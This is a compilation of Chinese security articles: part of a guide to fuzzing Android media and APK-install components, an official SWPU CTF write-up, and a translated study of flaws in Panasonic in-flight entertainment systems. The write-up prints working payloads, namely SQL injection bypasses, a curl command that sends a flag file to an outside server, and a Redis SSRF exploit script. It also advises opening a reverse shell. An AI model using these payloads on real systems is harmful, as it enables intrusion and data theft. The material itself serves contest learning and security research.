crash,这样的crash很有可能就是一个有用的crash(也许会带来一个可利用的漏洞)分类机制在Fuzzing进行了一定时间后会产生很多的crash,但是这些crash中有很多都是差不多的,分类机制的作用就是把大量的重复的crash识别出来,然后把每一个独特的crash保存起来,这样可以大大减少研究人员后期分析的工作量.在每次系统崩溃后,系统会在/data/tombstones生成一个tombstone文件.在该文件中包含很多有用的信息,其中包括了程序崩溃时pc寄存器的值,寄存器和sp寄存器附近的值,以及栈回溯.一般来说我们可以通过程序崩溃时pc寄存器的值来唯一确定一个crash.下面来看一个被恶意媒体文件导致media server崩溃之后生成的tombstone文件的内容.下面给出对 crash分类机制的实现方法.1.解析程序日志,确定造成程序crash的输入数据.2.拿这个输入数据再次测试3.对每一次的测试:    a.拿到生成的tombstone    b.解析tombstone文件拿到pc值    c.检查这个pc值是否已经被记录过了.    d.如果pc值是一个新的值,那么就把tombstone和测试用例保存起来. 在Android中分析和调试 Crash在安卓中有很多的方法和工具能够被用来找出在程序发生崩溃时,到底发生了什么.tombstone中包含的最相关的信息是崩溃的堆栈跟踪，造成崩溃的signal，signal的code，发生错误的地址和PC的值。例如对于segmentation fault signal 我们可以有一个code 1（SEGV_MAPERR），这意味着 地址未映射到对象或code 2（SEGV_ACCERR），这意味着我们对这个映射对象没有权限。 Dmesg是用于调试Android上的崩溃的另一个选择。 这是类Unix 操作系统中一个常见的命令,用于打印内核的消息缓冲区。 下面是2个Stagefright media framework崩溃的消息的示例 。这个消息给出的是要访问不可访问的页,以及要向用户空间不可写的页写数据.以下是这些错误码在Dmesg中的对应的消息解释.GDB也可以在Android环境中用作更可靠的调试解决方案。要使用gdb来调试crash,需要使用可在Android平台下运行的gdbserver.首先我们需要将gdbserver附加到要调试的程序上并监听一个端口.之后需要把端口转发下,并在在pc上用gdb连到gdbserver上.然后为了方便调试,我们可以加载调试符号.如果在分析崩溃时我们有源代码,如果能把崩溃点对应到源代码中那自然是最好不过的了,这样可以很方便的帮助我们分析Crash,以便更好地了解发生了什么.这时我们就可以使用linux上的 addr2line 命令了.要使用该命令你需要将PC寄存器的值传给这个程序.下面来一个示范.Fuzzing the media Framework in Android这个项目的主要思路是先创建损坏但结构有效的媒体文件，然后把他们交给目标程序去解析,并且监控程序的状态,来发现潜在的问题.。 具体的实现是,通过使用定制开发 Python脚本来向分布式的Android设备上发送畸形的文件， 记录结果并以自动化方式监控可能的问题。 而让组件来解析我们的畸形文件用的是Stagefright命令行命令实现的 。最后通过使用定制的Crash分类机制来识别出独特的Crash。音频和视频作为攻击向量无论是在传统PC还是移动平台上,音频和视频文件都一直是最受欢迎的攻击向量.这样的一种现象的出现是有很多原因的.1.多媒体文件格式一般比较复杂,往往包含很多复杂的数据结构.这样解析这些数据时,程序犯错的可能性就会很大.而且考虑到效率等因素解析多媒体文件格式的程序基本都是用C写的,这也很容易造成一个内存崩溃.2.现在市面上有大量的多媒体文件解析器(播放器),他们对各种各样多媒体文件格式的解析方式不尽相同,这样一来攻击面又扩大了不少.3.用户们普遍认为一个音频或者视频文件并不会造成什么实质性的影响,于是他们往往会去下载和播放未知来源的视频或音频.4.可以未经用户明确同意播放音频或视频.比如:媒体文件在网页内播放，媒体文件通过MMS发送,这时系统会自动解析媒体文件.The Stagefright frameworkStagefright框架在Android中负责解析各种多媒体文件的算法逻辑。 这个框架的一般体系结构可以在下图中观察到Stagefright 只是媒体播放器AwesomePlayer的客户端.这个组件 实现了将视频和音频字幕源与相应的连接的功能，能够在播放用户提供的媒体文件时使视频与音频字幕同步。 MediaExtractor组件通过给定的媒体文件类型调用适当的数据解析器。 最后，为了准备播放，AwesomePlayer使用OMXCodec 组件，以便设置用于每个数据源的解码器开始Fuzzingstagefright命令行接口被用于在进行测试的Android设备上来解析每个恶意的媒体文件 它可以从Android源码树定制，其主要能力是对媒体文件进行解码/编码，强制使用 软件或硬件编解码器和用于音频文件的回放功能。 这个工具的完整的功能列表如下： 畸形文件数据的生成是在连接着正在测试的Android设备的本地机器上完成的。 这个过程通常使用Basic Fuzzing Framework,zzuf或 Fuzzbox这些开源的fuzz工具。 然后将畸形的文件发送到Android设备上，之后Android设备上通过使用 stagefright命令行接口对畸形文件进行解析 。 在fuzzing过程中 使用上一节中指定的格式生成日志。 下面是一个在fuzzing Stagefright框架(媒体文件使用BFF变异)过程中收集到的日志:Fuzzing the application install process in Android对于这个特定的项目，fuzzing已被用来使用多种方法修改APK的不同组件，并检查这如何影响Android中的安装过程。APK的内部的主要目标是由程序代码编译得到的 classes.dex和 AndroidManifest.xml文件。事实上在apk的安装过程中其中一个 installd进程是以较高的系统 特权运行的，这使得这个组件成为一个非常有吸引力的目标，因为在fuzzing期间发现的任何问题的可以在系统安全层面产生很大的影响。 本节将概述项目中会涉及的Android进程。 此外，该部分还会介绍两种不同的fuzz方法(用来测试两种不同的安卓版本:KitKat和Lollipop),在实际的fuzzing过程,他们会被视为一个单独的主题。 Android中应用程序安装过程的概述 PackageInstaller是Android上负责安装其他应用程序的默认应用程序。 包安装器调用InstallAppProgress activity来接收来自用户的指令。 此activity调用 Package Manager Service中以system权限运行的installd 守护进程来安装apk，并且其主要功能是接收来自Package Manager Service的请求。 在安装apk时系统地会调用两个主要的方法run_dexopt(KitKat)以及 run_dex2oat(ART)他们实际上是使用了dexopt 和dex2oat两个命令行工具.这就是这次fuzzing的主要目标了.一个apk文件中有四个我们感兴趣的组件分别为,classes.dex  manifest文件,META-INF文件夹,lib文件夹.下图为各个组件的概览.我们写的Android app的代码最后会被编译成.dex文件,并使用zip打包成为apk文件.下面是dex文件格式的一个概览.                                                            具体的文件格式可以参考:http://blog.sina.com.cn/s/blog_66d7a4550101bkqg.html开始Fuzzing这次的fuzzing考虑到了两个不同的Android版本,分别为KitKat和Lollipop.Fuzzing KitKat 尽管dexopt可以作为一个独立的二进制程序在命令行中被使用,但是他却不能被用于fuzzing,原因是他需要非常多的参数,而且有些参数还不能通过shell环境变量传递给他.在这样的一种情况下我们的fuzz采用了正常的apk过程来使程序运行我们的测试数据.大体思路是:拿到大量的合法的apk文件,然后对他们中的classs.dex 文件进行变异,之后在重打包为apk文件,最后把他交给Android的安装apk的进程去处理,并且监控其是否发生崩溃.以下是一些具体步骤:1.从种子apk文件中解压出classes.dex文件 :  unzip –d &lt;/local/path/&gt; &lt;/apk/path/&gt;2.fuzz解压出的dex文件:  &lt;fuzz&gt; –s &lt;seed&gt; classes.dex &gt; fuzzed.dex3.在原来的apk文件中移除掉原来的dex文件: aapt r &lt;original_apk&gt; classes.dex4.使用fuzz得到的dex文件重打包为一个新的apk文件: aapt r &lt;original_apk&gt; classes.dex5.生成签名文件:   keytool -genkey -v -keystore keystore.keystore -alias keystore -keyalg RSA -keysize 2048 -validity 100006.移除apk中的META-INF目录: zip --delete &lt;/apk/path/&gt; META-INF/*7.用我们刚刚生成的签名文件对apk签名.:jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore &lt;/keystore/path&gt; &lt;/apk/path&gt; &lt;keystore_alias下面是在fuzz kikat时的部分日志.Android Lollipop和dexopt不同,dex2oat这个程序可以使用它的命令行参数来完成解析dex文件的工作,那么我们的fuzz就使用了这个工具的命令行接口来进行后续的fuzz.他需要两个参数分别为: 输入的dex文件,和输出的 oat文件.其参数列表如下:那么在Lollipop上进行fuzz的思路就是,首先拿到一个初始化的dex文件集(可以从之前的那些apk文件中提取),然后对他们进行变异,之后把变异后的文件交给dex2oat去解析.如果检测到了崩溃,我们还需要把dex文件重新打包到apk文件中,然后使用apk的安装流程再次测试来确认这是一个可以重现的Crash.下面是一个fuzz的日志的例子.在Android上使用AFLAFL是现在比较流行的一个Fuzz工具,他原本是运行在linux PC上的,后面经过Adrian Denkiewicz的修改使得我们可以在Android上使用这款神器.Using AFL for Stagefright fuzzing在Android上使用AFL的一个最大的挑战就是怎样完全自动化的进行整个Fuzzing过程.下面一个大体的思路.为了实现更加好的自动化fuzz效果使用了如下的架构. 总结Fuzz安卓的一些系统组件和Fuzz其他的位于PC的程序在本质上并无区别,只是在提交测试数据给程序执行这一步需要做的工作会更多以及对程序Crash的日志监控机制还不是太完善.","2016-11-24 14:16:21","移动安全","Fuzzing Android：挖掘Android系统组件组件中的漏洞","http://nsoad.com/Article/MobileSecurity/20161124/846.html"
"5ccbf9f44f2f0a0a7a69bff0","misc 100-1http://misc.08067.me/misc4misc 100-1 很简单，就是jsfuck和brianfuck两次编码，直接解出即可。 Misc 100-2http://misc.08067.me/misc3/Misc 100-2题目给的是","Kong","misc 100-1http://misc.08067.me/misc4misc 100-1 很简单，就是jsfuck和brianfuck两次编码，直接解出即可。 Misc 100-2http://misc.08067.me/misc3/Misc 100-2题目给的是一个图片，用winhex打开看到底部的密文Base32解密得到：vbkq{ukCkS_vrduztucCVQXVuvzuckrvtZDUBTGYSkvcktv}发现是凯撒加密，不过奇偶数移位方向不一样，发现偏移量是16，用脚本跑一下str = ""vbkq{ukCkS_vrduztucCVQXVuvzuckrvtZDUBTGYSkvcktv}""for i in range(26):    key = ''    for x in str:        s = ord(x)        if (s not in range(97,123)) and (s not in range(65,91)):            key = key + chr(s)        else:            #print chr(s)            if s in range(97,123):                if s % 2 == 0:                    s = s - i                    if s not in range(97,123):                        t = 97-s                        t = 123-t                        key = key + chr(t)                    else:                        key = key + chr(s)                else:                    s = s + i                    if s not in range(97,123):                        t = s-122+96                        key = key + chr(t)                    else:                        key = key + chr(s)            else:                #print chr(s)                if s % 2 == 0:                s = s - i                    if s not in range(65,91):                        t = 65-s                        t = 91-t                        key = key + chr(t)                    else:                        key = key + chr(s)                else:                    s = s + i                    if s not in range(65,91):                        t = s-90+64                        key = key + chr(t)                    else:                        key = key + chr(s)    print keyMisc 150http://misc.08067.me/misc2/打开wireshark数据包，提取http数据，得到一个flag.zip，解压得到一个ce.txt文件，打开发现是一个rgb图片的像素点，然后用脚本还原即可。from PIL import Imageimport reif __name__ == '__main__':    x = 887    y = 111    i = 0    j = 0         c = Image.new(""RGB"", (x,y))    file_object = open('ce.txt')         for i in range(0,  x):        for j in range(0,  y):            line = file_object.next()            lst = line.split("","")            c.putpixel((i, j), (int(lst[0]), int(lst[1]), int(lst[2])))         c.show()    c.save(""c.png"")web 200-1http://web1.08067.me/注入，过滤了空格、#、*、union、like、regexp、and、or、|、--、&amp;、%0a、%0b、%0c、%0d等，需要想办法用其他操作符连接注入语句和闭合’。mysql操作符参考：http://blog.csdn.net/yuzongtao/article/details/45044963几个可用的poc：uname='!=!!(ascii(mid((passwd)from(1)))=99)!=!!'1&amp;passwd=dddduname=12'%(ascii(mid((passwd)from(1)))=99)%'1&amp;passwd=dddduname=12'%(ascii(mid((passwd)from(1)))=99)^'1&amp;passwd=dddduname=12'-(length(trim(leading%a0'c12'%a0from%a0passwd))&lt;32)-'0&amp;passwd=1来到后台，可以执行命令，但是对反弹shell的一些关键字做了过滤，对空格也做了过滤，只能通过cat读取flag，没又回显，然后打到用远程vps的日志上面exp：curl$IFS\vps:1234/`cat$IFS\../../flag`web 200-2http://web3.08067.me/这道题主要是考察了php底层 wakeup 的一个bug，https://bugs.php.net/bug.php?id=72663这道题根据tips:编辑器，可以考虑到.bak文件泄露通过 robots.txt 发现了 function.php  commom.php , 最后找到了 function.php.bak  index.php.bak我们就获得了 整道题的代码Index.php.bak 我们可以看见了这里 通过 cookie 的登陆/function.php.bak其他过滤代码 在该文件都可以得到addslashes_deep() 是无法绕过的，我们就只能绕过wakeup根据那个bug 的描述，我们直接进入 __destruct() ,这里我们取出了 $this-&gt;name$this-&gt;name 是base64decode后，然后反序列化得到的，不用考虑waf等东西我们看了这里只有一个 Checksql($sql)//sql 过滤 static function CheckSql($db_string,$querytype='select') { $clean = ''; $error=''; $old_pos = 0; $pos = -1; if($querytype=='select') { $notallow1 = ""[^0-9a-z@\._-]{1,}(load_file|outfile)[^0-9a-z@\.-]{1,}""; if(preg_match(""/"".$notallow1.""/i"", $db_string)) { exit(""Error""); } } //完整的SQL检查 while (TRUE) { $pos = strpos($db_string, '\'', $pos + 1); if ($pos === FALSE) { break; } $clean .= substr($db_string, $old_pos, $pos - $old_pos); while (TRUE) { $pos1 = strpos($db_string, '\'', $pos + 1); $pos2 = strpos($db_string, '\\', $pos + 1); if ($pos1 === FALSE) { break; } elseif ($pos2 == FALSE || $pos2 &gt; $pos1) { $pos = $pos1; break; } $pos = $pos2 + 1; } $clean .= '$s$'; $old_pos = $pos + 1; } $clean .= substr($db_string, $old_pos); $clean = trim(strtolower(preg_replace(array('~\s+~s' ), array(' '), $clean))); if (strpos($clean, '@') !== FALSE OR strpos($clean,'char(')!== FALSE OR strpos($clean,'""')!== FALSE OR strpos($clean,'$s$$s$')!== FALSE) { $fail = TRUE; if(preg_match(""#^create table#i"",$clean)) $fail = FALSE; $error=""unusual character""; } elseif (strpos($clean, '/*') !== FALSE ||strpos($clean, '-- ') !== FALSE || strpos($clean, '#') !== FALSE) { $fail = TRUE; $error=""comment detect""; } elseif (strpos($clean, 'sleep') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])sleep($|[^[a-z])~is', $clean) != 0) { $fail = TRUE; $error=""slown down detect""; } elseif (strpos($clean, 'benchmark') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])benchmark($|[^[a-z])~is', $clean) != 0) { $fail = TRUE; $error=""slown down detect""; } elseif (strpos($clean, 'load_file') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])load_file($|[^[a-z])~is', $clean) != 0) { $fail = TRUE; $error=""file fun detect""; } elseif (strpos($clean, 'into outfile') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])into\s+outfile($|[^[a-z])~is', $clean) != 0) { $fail = TRUE; $error=""file fun detect""; } if (!empty($fail)) { exit(""Error"" . $error); } else { return $db_string; } } }这就是改版的80sec-ids ，这里只要研究一下就会发现，这里可用sleep() 函数，绕过80sec-ids 进行盲注，就可以得到flag了.web 100http://web2.08067.me/这是一道基于php特殊协议的利用的题目。根据首页提示，可以发现include.php页面存在文件包含漏洞，利用参数file,右键源码查看获tips：upload.php。上传加文件包含很容易想到getshell。首先利用php://filter读取两个文件的源码，可以发现只能上传图片文件，并且file参数后强行加了php后缀，又过滤了..，所以不能跨目录，php版本为5.5，也不存在截断。而且这个环境并不支持zip协议，于是只有利用phar://协议getshell。构造xxx.zip文件，里面加入我们的一句话文件并压缩，改名为图片后缀名上传，最后getshell，exp如下： Web 200 -3http://web2.08067.me/这道题是接着web100之后的，拿到web100的shell后，就会在根目录下发现tips文件，获得hint: tomcat.08067.me以及flag2在root目录下，这很容易让人想到需要提权。访问tomcat.08067.me这个地址后，发现tomcat的管理后台是404，也就是说一些常规的tomcat部署war的漏洞无法利用，但又需要提权所以很容易联想到最近爆出(CVE-2016-1240)tomcat本地提权漏洞。这样就需要从apache权限用户获得一个tomcat用户权限，这个地方确实有一点小脑洞。我们设置了tomcat的web根目录为apache可写，这样就可以通过菜刀翻到tomcat的web根目录写入jsp一句话获得tomcat权限，最后再上exp获取root权限即可。参考地址：http://www.freebuf.com/vuls/115862.html利用过程中注意事项:1.写入exp的时候注意windows下的换行是\r\n，而linux下的是\n.2.获取tomcat的webshell后最好反弹一个shell到自己的vps上，用交互式shell更方便操作。(这个题上线的前一天，出现了脏牛漏洞，导致很多师傅在服务器上尝试用脏牛提权。所以服务器会崩溃，最后写了定时回滚脚本解决。)web 200-4http://web7.08067.me/web7这个题是用cherry写的，一个轻量级的python web框架,在400错误的时候就可以知道。前端写得比较烂，直接一个表单加张背景图片。~/~这个题是利用了Python urllib HTTP头注入向然后造成ssrf，操作redis可以更改管理员账号密码，然后登录。但是提示fast fast fast。其实是后台有个脚本在一直修改账号密码，所以导致登录不成功，所以需要多线程去操作redis修改账号面膜然后登录。(这里有脑洞，已吊打出题人）脚本实现import requestsimport threadingdef test():    while True:        try:            url = ""http://web7.08067.me/web7/input""            data = {'value': 'http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20admin%20xx00%0d%0aSAVE%0d%0a:6379/foo'}            requests.post(url, data=data)        except Exception, e:            passdef test2():    while True:        try:            url = ""http://web7.08067.me/web7/admin""            data = {'passworld': 'xx00'}            text = requests.post(url, data=data).text            if 'flag' in text:                print text        except:            passlist = []for i in range(10):    t = threading.Thread(target=test)    t.setDaemon(True)    t.start()    list.append(t)for i in range(10):    t = threading.Thread(target=test2)    t.setDaemon(True)    t.start()    list.append(t)for i in list:    i.join()web 300http://web5.08067.me/这个题一看界面，就想到时ssrf经过测试，可以直接发起请求，也没有任何的内网地址过滤。然后就是寻找内网段。这里就是利用file://协议去读本机的网卡。centos的网卡地址/etc/sysconfig/network-scripts/ifcfg-eth0。然后得到这台主机 所处的内网的网段是在172.16.181.0/24段。然后探测下C段，发现只有172.16.181.166主机的80 存在一个应用。尝试扫一波目录，发现了一个常规目录admin/login.php,访问之，发现一个登陆表单不过，这里的method是POST既然是POST，自然就想到了利用gopher协议构造POST包。这里开始 就需要特别细心了。大概有以下几点：1.这里的表单action是wllmctf_login.php而不是login.php,很多师傅就是这里被坑了一波。2.gopher发包一定要填写端口，因他不像http默认走80端口。3.注意post包里面的Content-Length的长度一定要和post的内容长度相符合，很多师傅这个地方都忘记了，导致被坑了很久4.记得加上Content-Type: application/x-www-form-urlencoded，然后记得是两次url编码大概的构造好之后的poc如下图，可以看到，这里用户名错误会报error names，如果密码错误回返回password error。很容易测出来这个这个地方有注入，什么都没有过滤，是bool盲注，所以只接就能写脚本跑用户名密码。最后得到用户名是admin，跑出的密码MD5解密之后是xiaozhang123.最后填入正确用户名和密码。得到flag这个题不难，贵在一定要细心啊web 400http://web4.08067.me/这是一道代码审计的题，访问 /web.zip  就拿到了源码，我们在 riji.php 这里发现了由于是伪全局 机制，我们这里可以发现一个变量覆盖，只要在登陆后，让查询用户不存在就可以了，下面漏洞触发点为再看 api.php, 我们这里看见了 del_user 操作，只要删除了用户，我们就可以触发上面的变量覆盖漏洞了，权限确认这里，一看这种校验方式 就会发现存在 hash扩展攻击，然后我们需要找到 admin 的key 的一个密文就可以构造密文，绕过权限验证了，Forget.php 找回密码处我们发现了可以获取任意用户key的md5加密的密文，这里hash扩展攻击的条件已经满足我们再来继续看看 api.php http://p6.qhimg.com/t015d17929ef0aba910.png这里我们就需要找到当前用户的id才能删除我们的用户，/index.php 就会将 userid 写入到 cookie 中，删除条件就满足了所以整体逻辑就是，先登录用户，抓取 userid ，然后找回 管理员(admin) 的密码然后 通过api.php 接口删除用户，我们用登陆后的用户访问 riji.php ，传入 id 参数就可以了，这里没有任何过滤，直接联合查询，就查到了flagCM50http://misc.08067.me/CM50/第一眼看题。 好直接上工具！  eXeScope哒~哒  就在这里！CM100http://misc.08067.me/CM5100/直接丢IDA 然后搜字符窜。Wrong~  找到关键函数。仔细看看其实算法很简单只是其余处理稍微复杂。其实就是一步异或操作。寻找到常量 26544631 和 12345678 进行异或。Flag出来了                           Flag{lr{-l0F-)uFe?} CM150http://misc.08067.me/CM150/Apk逆向出题人不太会，直接贴源码吧！encode = Encode1(Flag,Flag.length());          encode1 = Encode2(encode,Flag);          flag = check(encode1);              if (flag==1)                {                 Toast.makeText(MainActivity.this, ""WOw~, You got it !"", Toast.LENGTH_SHORT).show();                  }                 else                 {                  Toast.makeText(MainActivity.this, ""trg again~"", Toast.LENGTH_SHORT).show();两个加密函数，一个检查函数，进去public String Encode1(String Flag , int len){char [] xor = Flag.toCharArray();int key = 29; int temp;int [] encode = new int [16];if (len == 16){for (int i = 0;i&lt;Flag.length();i++){encode[i] = (int)xor[i];encode[i] = encode[i]^key;}for (int i = 1 ; i&lt; 8 ; i++){temp = encode[i];encode[i] = encode[15-i];encode[15-i] = encode[i];}for (int i = 0 ; i&lt; 16 ; i++){xor[i] = (char)encode[i];}return String.valueOf(xor);}else{Flag = ""lalalalalalala~~"";return Flag;}}public String Encode2(String encode,String Flag){char [] xor1 = encode.toCharArray();char [] xor2 = Flag.toCharArray();   for (int i = 0;i&lt;16;i++){if (i%2 == 0)xor1[i] = xor2[i];}   return String.valueOf(xor1);  }public int check(String encode1){char [] xor = encode1.toCharArray();int []sum = new int [16];int []sum1 = {73, 48, 109, 97, 115, 46, 95, 116, 105, 111, 51, 89, 124, 73, 45, 73};for (int i = 0 ; i&lt; 16; i++){sum[i] = (int)xor[i];if(sum[i] != sum1[i])return 0;  }return 1;}由于出题人水平问题，导致此题有多解(已被吊打)CM200http://misc.08067.me/CM200/CM200其实就是RC4的应用。下GetWindowText断下来，出题人VM了两个函数强行加大了难度，但是从其他调用函数还是能够看出来是RC4。识别出来了是RC4，剩下就是找key 和  Ecode了。关于key：你很容易就能找到 swpu。关于Ecode：0x34, 0x73, 0xffffffaa, 0xffffffd9, 0xffffff88, 0x10, 0xfffffff7, 0xffffffab, 0xffffffbb, 0x7, 0xffffffc6, 0xffffff8b, 0xffffffd1, 0xffffff92, 0x20, 0xffffffed, 0x25, 0x2f, 0x32, 0x27, 0xffffffdc转一下再解RC4Flag出来了                          Flag{y3s_Is_tH3_LaSt}当然这道题还有其他解题思路，我也从其他大牛那里学到了按位爆破。CM300：http://misc.08067.me/CM300/ CM300分为两个部分第一个为key 和 第二个部分 flagKey输入进行md5加密。找到常量186, 23, 99, 168, 254, 185, 21, 172, 61, 195, 239, 219, 52, 229, 129, 55转为16进制。再去解md5就OK。Flag部直接贴码了void Encode1(unsigned char *decrypt, unsigned char *Flag){for ( int i = 0; i &lt; 16; i++){  Flag[i] ^= decrypt[i];if (i % 2 == 0 &amp;&amp; i &lt; 9)Flag[i] -= 40;if (i % 2 != 0 &amp;&amp; i &lt; 9)Flag[i] += 1;if (i&gt;=9){if (i &lt; 12)Flag[i] -= 50;elseFlag[i] -= 9;}}  }  void Encode2(unsigned char *decrypt, unsigned char * Flag){for (int i = 0; i &lt; 16; i++){Flag[i] ^= 29;  if (i%2 != 0){Swap(&amp;Flag[i-1],&amp;Flag[i]);}}Encode1(decrypt, Flag);  }  void Swap(unsigned char *p1, unsigned char *p2){char temp;temp = *p1;*p1 = *p2;*p2 = temp;}    int Decode(unsigned char * Flag)  {int i = Flag[0] - 199 + Flag[1] - 171 + Flag[2] - 93 + Flag[3] - 153 + Flag[4] - 6 + Flag[5] - 38 + Flag[6] - 127 + Flag[7] - 76 + Flag[8] - 79 + Flag[9] - 177 + Flag[10] - 67 + Flag[11] - 29 + Flag[12] - 122 + Flag[13] - 144 + Flag[14] - 135 + Flag[15] - 230 - 15;return i;}","2016-10-30 02:10:43","CTF专题","第七届swpu-ctf官方Writeup","http://nsoad.com/Article/CTF/20161030/665.html"
"5ccbf9f44f2f0a0a7a69bff1","我在IOActive已经有五年了，我有很多去好地方的机会，经常离家有几千公里远，所以飞行显然是我日常生活的一个组成部分。","kong","翻译：pwn_361前言我在IOActive已经有五年了，我有很多去好地方的机会，经常离家有几千公里远，所以飞行显然是我日常生活的一个组成部分。你可能不认为这是一个大问题，除非像我一样，你害怕飞行。我不认为我可以完全摆脱这种焦虑；几十个航班后，我的手仍然会在起飞时出汗，但我学会了生活，有时甚至享受它……并在飞行中，做一些关于机载系统的攻击研究。研究飞机上的设备如何在飞机上工作，能帮我减轻恐惧感，并且能习惯于噪音、碰撞、和强烈的气流。这篇文章主要研究机载设备如何在飞机上工作，特别是松下航空电子的机载娱乐系统(IFE)。两年前，当我从华沙飞往迪拜时，在飞机上，我决定试试运气，玩一玩IFE，当我触摸屏幕上一个角落的某个特定区域时，突然，设备返回了一段调试信息：到迪拜后，我花了一点时间在GOOGLEH搜寻这些关键字，我发现了为多家航空公司开发的几百个公开可用的固件更新：这些文件显然还在不断更新，所以有可能获得部署在飞机上的最新版本。这些文件今天仍然在，虽然目录列表有所不同。我能够找到固件更新的航空公司包括：阿联酋航空法航阿根廷航空公司美国联合航空公司维珍航空公司新加坡航空公司芬兰航空公司伊比利亚航空公司阿提哈德航空公司卡塔尔德航空公司荷兰皇家航空公司美国航空公司斯堪的纳维亚航空公司IFE包含下面这些基础的体系结构系统控制单元（SCU）这需要一个被认证过的机载服务器。乘客可以实时获取有关飞行的信息，如风速、纬度、经度、高度和外界温度。SCU通常通过航空总线接收所有这些数据（航空总线ARINC 429），并通过以太网显示到座位显示单元（SDU）。座位显示单元(SDU)这个LRU（线性可替换单元）允许乘客使用IFE的被动和主动的功能，比如看电影，购物，阅读，或连接到互联网。它基本上是一个有触摸屏的嵌入式设备，最新的基于Android，而传统设备主要使用Linux。个人控制单元（PCU）遥控器就算是个人控制单元之一。PCU可以控制SDU，和我后面要讲到的，它也可以作为一个信用卡读卡器。机组人员控制板乘务员和其他机组人员使用这些设备来控制飞机的功能，如灯，执行器（包括床），通告，机上购物，或专业音频系统，以满足乘客的需求。客舱管理系统（CMS）和IFE通常集成在一块。松下航空电子集成了飞机的CMS和机载娱乐系统（IFE），以及全球通讯服务系统，操作简单，共享系统功能。松下机载娱乐系统有多款松下机载娱乐系统：有老旧的3000/3000i，最新的是X系列的eFX, eX2 和eX3（基于Android系统），硬件可能会有所不同，但他们有一个类似的体系结构和一些共同的特点。你可以在松下航空电子设备官方网站中找到。这些系统支持相当多的个性化功能，这允许航空公司部署经过定制的IFEs，而代码库大致是一样的。通常IFEs在飞机着陆后，通过Wi-Fi 点对点网络或高速移动数据链进行内容更新。松下航空电子IFEs大多数经过“跑腿网络”(意思是，这些设备在飞机飞行中是不联网的，一般更新数据是在飞机着陆以后)，在飞行过程中，卫星通信或定制的移动数据连接也是可能的。然而，在大多数情况下，IFES是离线操作的，其内容是预先装入的。通常IFE甚至不会实时检查信用卡。松下电子IFE采用客户端-服务器架构，有以下三个主要组成部分：1. CrewApp2. SeatApp3. Backend  在上述的网站中，我发现了多种版本的CrewApp和SeatApp，当我在GOOGLE上搜索确定的关键字时，我发现IFE的后端源代码是公开曝光的，只是在不同的航空网站上。虽然它包含特定航空公司的定制功能和数据，但是它们使用的后端代码都是松下的。当然，在这篇文章里不可能把所有的变化都说清楚，由于各航空公司和其他公司根据他们的需要，对松下的框架进行了匹配和扩展，因此，我们将只专注于特定的功能。我分析的这个固件文件不包含完整的系统，仅仅是更新的文件。这很遗憾，否则我们就可以获得更多关于这些设备底层工作的细节。然而，通过查阅可用文件也可以得到一些有趣的细节。脚本分析松下航空电子设备定义了自己的脚本语言，用于程序扩展、GUI接口和主程序的各项功能。它有几十个命令，覆盖所有功能。对主要的二进制(airsurf)进行逆向，我们可以还原出这个脚本格式对应的解析器是如何工作的。为了说明这些，让我们来看看#define。解析器对脚本会逐行进行处理，当解析器遇到“#define”声明时，会尝试跳转到sub_80C2690解析这个声明。在这个函数中定义了五种类型：flash, text, draw, timer, 和value。脚本中的第一行是一个“#define”值，我们来看一看它是怎么处理的。首先，读取了这一行，并提取了定义的名称。随后，解析器会检查后面的值（下面绿色的区域）是不是一个数字（蓝色区域）。如果这个值不是一个数字，则对一系列变量进行检查。如果是一个数字，它会扩展这个值。如果这个值是一个数字，则将名称和值做为一对，添加到定义的全局数组中(下面蓝色区域)。对于cmd声明，这个二进制会遍历cmd表，并调用相关函数，传递参数。我们在这里可以看到一些有趣的功能，例如程序从读卡器上读取信用卡数据以后。从读卡器读出的数据（/ dev / CCR）被解析，跟踪打印出来，并确认。我们在这里也可以看到普通的文件，如shell脚本，配置文件（包含硬编码凭证），数据库，资源，和库文件。在最新的X系列的IFEs中，松下将系统换成了Android，并将老的.txt脚本模式换成了QT QML(QML是Qt推出的Qt Quick技术的一部分，是一种新增的简便易学的描述语言)。后台用了PHP，初步分析表明，它存在漏洞：图片中的代码属于“座位到座位”的聊天功能。在这里，乘客可以向他人发送信息。你不需要花很长时间就能发现一些问题，而且问题不只一个。下面的视频是实际漏洞的测试方法，它们没有飞机的安全风险。1. 绕过信用卡检查2. 任意文件访问3. sql注入潜在的影响那么，一个攻击者离接到机载娱乐系统中并利用漏洞还有多远呢？对此，还没有确定的回答。但是，我们做一些假设（不针对任何公司和系统）。在航空系统和设备认证时，在软件方面，会依靠专用的DO-178B标准(机载软件适航标准)，IFE在技术上是D到E级之间。松下航空电子的IFE设备是E级认证。这基本上意味着，即使整个系统失败了，对飞机安全也没有任何影响，并且不会让乘客有不适感。同样，我要说的是，根据被处理数据的类型，飞机的数据网络被分为四个数据区域：乘客娱乐、乘客自带设备、航空信息服务、和最后的飞机控制。物理控制系统应位于飞机控制区域，必须和乘客区域相隔离；然而，并不总是这样的，一些飞机使用光学数据二极管，而另一些依靠电子网关模块。这意味着，这两个数据区域只要有一个物理连接路径，我们就不能忽略潜在的攻击。机载娱乐系统就有可能成为一个攻击终端。在某些情况下，这样的攻击在物理上是不可能的，原因这些系统是物理隔离的，但是在特殊情况下，如果能成功建立物理连接，攻击仍然在理论上是有可能的，IOActive成功入侵了非航空交通工具上的电子网关模块。在乘客娱乐系统、自有设备区域与飞机控制区域之间，拥有跨越“红线”的能力很大程度上依赖于目标飞机上部署的特定设备、软件和配置。在2014年，我们展示了卫星通讯(SATCOM)设备上的一系列漏洞。包括机载的SATCOM终端。一个重要关注点是不同数据域之间共享这些卫星通信设备，这会允许一个黑客利用这些设备，并将IFE作为一个支点，对某一航空电子设备发起攻击。在IT的一面，取得IFE的控制权，意味着一个黑客能向飞机上的乘客发出各种通知信息。例如：黑客可以发布虚假的飞行信息，如高度或风速、并可以在交互式地图中显示虚假航线信息。也有可能危害到CrewApp 